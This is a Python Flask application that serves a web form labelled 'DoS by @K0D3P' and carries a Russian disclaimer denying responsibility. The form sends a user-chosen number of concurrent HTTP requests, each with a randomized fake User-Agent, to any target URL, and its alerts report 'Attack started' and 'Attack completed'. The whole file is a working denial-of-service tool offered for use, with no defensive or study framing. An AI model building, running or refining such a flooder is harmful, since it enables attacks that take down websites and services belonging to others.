from flask import Flask, request, jsonify
import aiohttp
import asyncio
from faker import Faker

app = Flask(__name__)
fake = Faker()

async def fetch(session, url, user_agent):
    headers = {'User-Agent': user_agent}
    async with session.get(url, headers=headers) as response:
        return await response.text()

async def send_requests(url, num_requests):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_requests):
            user_agent = fake.user_agent()
            tasks.append(fetch(session, url, user_agent))
        responses = await asyncio.gather(*tasks)
        return responses

@app.route('/send_requests', methods=['POST'])
def send_requests_endpoint():
    data = request.json
    url = data.get('url')
    num_requests = data.get('num_requests')

    if not url or not num_requests:
        return jsonify({'error': 'Missing url or num_requests'}), 400

    try:
        num_requests = int(num_requests)
    except ValueError:
        return jsonify({'error': 'num_requests must be an integer'}), 400

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    responses = loop.run_until_complete(send_requests(url, num_requests))
    loop.close()

    return jsonify({'responses': responses})

@app.route('/', methods=['GET'])
def index():
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Async Requests</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 20px;
            }
            h1, h2 {
                font-size: 2.5em;
                text-align: center;
            }
            form {
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
                border: 1px solid #ccc;
                border-radius: 10px;
            }
            label {
                font-size: 1.5em;
            }
            input[type="text"], input[type="number"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                font-size: 1.2em;
            }
            button {
                width: 100%;
                padding: 10px;
                font-size: 1.5em;
                background-color: #4CAF50;
                color: white;
                border: none;
                border-radius: 5px;
                cursor: pointer;
            }
            button:hover {
                background-color: #45a049;
            }
        </style>
    </head>
    <body>
        <h1>DoS by @K0D3P</h1>
        <h2>Я не несу ответственности за ваши действия!</h2>
        <form id="requestForm">
            <label for="url">URL:</label>
            <input type="text" id="url" name="url" required><br><br>
            <label for="num_requests">Number of Requests:</label>
            <input type="number" id="num_requests" name="num_requests" required><br><br>
            <button type="submit">Send Requests</button>
        </form>

        <script>
            document.getElementById('requestForm').addEventListener('submit', function(event) {
                event.preventDefault();
                const url = document.getElementById('url').value;
                const num_requests = document.getElementById('num_requests').value;

                alert('Attack started');

                fetch('/send_requests', {
                    method: 'POST',
                    body: JSON.stringify({url: url, num_requests: num_requests}),
                    headers: {'Content-Type': 'application/json'}
                })
                .then(response => response.json())
                .then(data => {
                    if (data.responses) {
                        alert('Attack completed');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred');
                });
            });
        </script>
    </body>
    </html>
    """
    return html_content

if __name__ == '__main__':
    app.run(debug=True)